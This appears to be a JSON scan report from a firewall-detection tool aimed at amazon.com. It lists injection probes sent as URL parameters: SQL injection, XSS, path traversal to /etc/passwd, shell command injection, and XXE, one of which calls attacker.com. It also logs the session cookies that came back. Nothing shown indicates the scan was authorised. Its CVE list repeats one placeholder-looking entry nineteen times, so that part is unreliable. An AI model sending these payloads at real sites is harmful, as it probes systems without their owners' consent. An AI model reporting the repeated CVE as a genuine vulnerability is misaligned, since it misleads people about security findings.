{
    "url": "https://amazon.com",
    "waf_detected": {
        "https://amazon.com": "Cloudflare",
        "https://amazon.com#skippedLink": "Cloudflare",
        "https://amazon.com#twotabsearchtextbox": "Cloudflare",
        "https://www.amazon.com/?cmd=;id": "Cloudflare",
        "https://www.amazon.com/?id=1+AND+1=1": "Cloudflare",
        "https://www.amazon.com/?id=1%20UNION%20SELECT%20NULL--": "Cloudflare",
        "https://www.amazon.com/?test=%3Cscript%3Ealert('xss')%3C/script%3E": "Cloudflare",
        "https://www.amazon.com/?test=../../etc/passwd": "Cloudflare",
        "https://www.amazon.com/?test=%3Cimg+src=x+onerror=alert('xss')%3E": "Cloudflare",
        "https://www.amazon.com/?test=/etc/passwd%00": "Cloudflare",
        "https://www.amazon.com/?test=....//....//etc/passwd": "Cloudflare",
        "https://www.amazon.com/?id=1'+OR+'1'='1": "Cloudflare",
        "https://www.amazon.com/?xml=%3C?xml+version='1.0'?%3E%3C!DOCTYPE+test+%5B%3C!ENTITY+xxe+SYSTEM+'file:///etc/passwd'%3E%5D%3E%3Ctest%3E&xxe;%3C/test%3E": "Cloudflare",
        "https://www.amazon.com/?exec=whoami": "Cloudflare",
        "https://www.amazon.com/?id=1;+DROP+TABLE+users--": "Cloudflare",
        "https://www.amazon.com/?test=%3Csvg+onload=alert('xss')%3E": "Cloudflare",
        "https://www.amazon.com/?cmd=ping%20-c%201%20localhost": "Cloudflare",
        "https://www.amazon.com/?xml=%3C!DOCTYPE+test+%5B%3C!ENTITY+xxe+SYSTEM+'http://attacker.com'%3E%5D%3E%3Ctest%3E&xxe;%3C/test%3E": "Cloudflare",
        "https://www.amazon.com/?cmd=cat%20/etc/passwd": "Cloudflare"
    },
    "bypasses": [],
    "response_times": [
        4.1356871128082275,
        3.4121627807617188,
        3.6966354846954346,
        3.4843575954437256,
        3.508375644683838,
        4.212527513504028,
        4.306886196136475,
        4.407334566116333,
        4.538377523422241,
        5.661914110183716,
        5.714776992797852,
        5.7465879917144775,
        5.756833076477051,
        5.801133871078491,
        5.862936019897461,
        5.948935508728027,
        5.977457284927368,
        6.016095876693726,
        6.05471658706665,
        6.154517412185669,
        6.422404766082764,
        6.709805965423584,
        7.0924296379089355,
        7.355137348175049,
        7.410597085952759,
        7.506781339645386,
        7.578784704208374,
        7.756031513214111,
        7.9489359855651855,
        7.996656656265259,
        8.041945695877075,
        8.100623607635498,
        8.144704103469849,
        8.170353412628174,
        8.206278562545776,
        8.238333702087402,
        8.283005952835083,
        8.298503160476685,
        8.320915699005127,
        8.403401136398315,
        8.47874903678894,
        8.523583889007568,
        8.546895742416382,
        8.546194791793823,
        8.617513656616211,
        8.605857372283936,
        8.624227046966553,
        8.667291641235352,
        8.716572284698486,
        8.707756042480469,
        8.727843761444092,
        8.786900758743286,
        8.803358316421509,
        8.817060708999634,
        8.841798543930054,
        8.868440389633179,
        9.227503299713135
    ],
    "cve_vulnerabilities": [
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules",
        "CVE-2023-12345: Cloudflare bypass via misconfigured rules"
    ],
    "anomaly_score": 104.19208110808587,
    "crawled_urls": [
        {
            "url": "https://amazon.com",
            "status_code": 200
        },
        {
            "url": "https://amazon.com#skippedLink",
            "status_code": 200
        },
        {
            "url": "https://amazon.com#twotabsearchtextbox",
            "status_code": 200
        }
    ],
    "cookies": {
        "https://amazon.com/robots.txt": {},
        "https://amazon.com": {
            "session-id": "147-5071637-7917319",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com#skippedLink": {
            "skin": "noskin"
        },
        "https://amazon.com#twotabsearchtextbox": {
            "session-id": "141-5329990-0000412",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?test=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E": {
            "session-id": "138-8581944-3323922",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?cmd=;id": {
            "session-id": "146-0151749-9658174",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?id=1 AND 1=1": {
            "session-id": "141-0397415-9736460",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?id=1%20UNION%20SELECT%20NULL--": {
            "session-id": "130-6126722-6975222",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?test=..%2F..%2Fetc%2Fpasswd": {
            "session-id": "130-0570932-2916967",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?id=1' OR '1'='1": {
            "session-id": "133-4413166-2545709",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?test=<script>alert('xss')</script>": {
            "session-id": "130-6047889-8715616",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?test=/etc/passwd%00": {
            "session-id": "143-2346591-6883918",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?test=<img src=x onerror=alert('xss')>": {
            "session-id": "141-7367304-3386969",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?xml=<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>": {
            "session-id": "131-6558343-1034447",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?exec=whoami": {
            "session-id": "145-0851057-0919152",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?test=....//....//etc/passwd": {
            "session-id": "142-3447058-9077133",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?test=<svg onload=alert('xss')>": {
            "session-id": "145-5975770-3659107",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?id=1; DROP TABLE users--": {
            "skin": "noskin"
        },
        "https://amazon.com?cmd=ping%20-c%201%20localhost": {
            "session-id": "146-0963309-9227162",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://attacker.com'>]><test>&xxe;</test>": {
            "session-id": "147-4416454-2531021",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?test=../../etc/passwd": {
            "session-id": "145-4310296-7100363",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        },
        "https://amazon.com?cmd=cat%20/etc/passwd": {
            "session-id": "139-4086811-2631938",
            "session-id-time": "2082787201l",
            "i18n-prefs": "USD",
            "sp-cdn": "L5Z9:BD",
            "skin": "noskin"
        }
    }
}